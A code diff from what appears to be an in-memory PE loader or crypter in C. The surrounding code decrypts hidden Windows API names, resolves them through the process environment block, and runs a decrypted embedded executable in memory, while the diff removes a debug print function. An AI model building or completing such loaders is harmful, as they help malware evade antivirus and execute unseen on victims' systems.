@@ -97,13 +97,6 @@ void replacement_free(void *ptr) {
 }
 
 
-void print_minimal(void) {
-    const char *msg = "Hello from minimal printf\n";
-    HANDLE stdout_handle = ((HANDLE (__stdcall *)(DWORD)) kernel_library_function_addresses[9])(-11);
-    DWORD written;
-    ((BOOL (__stdcall *)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED)) kernel_library_function_addresses[8])(stdout_handle, (void*)msg, 26, &written, NULL);
-}
-
 // #include "executable.h"
 
 
@@ -196,7 +189,7 @@ void init_kernel_library(void){
     kernel_library_name = (const wchar_t *) (encrypted_kernel_library_name + iv_length);
     kernel_library_function_names = encrypted_kernel_library_function_names + iv_length;
      
-    __asm__("movl %%fs:0x30, %0" : "=r"(peb_windows_structure));
+    //__asm__("movl %%fs:0x30, %0" : "=r"(peb_windows_structure));
     kernel_library_address = get_module_address(peb_windows_structure, kernel_library_name);
     for(int i = 0; i < number_kernel_library_functions; i++){
 	const char *function_name = get_function_by_number(kernel_library_function_names, i);
@@ -434,7 +427,6 @@ void code_handling_execute(in_memory_pe *new_pe){
 
 int main(void) {   
     init_kernel_library();
-    print_minimal();
 
     decrypt_data(executable_pe, executable_size);
 
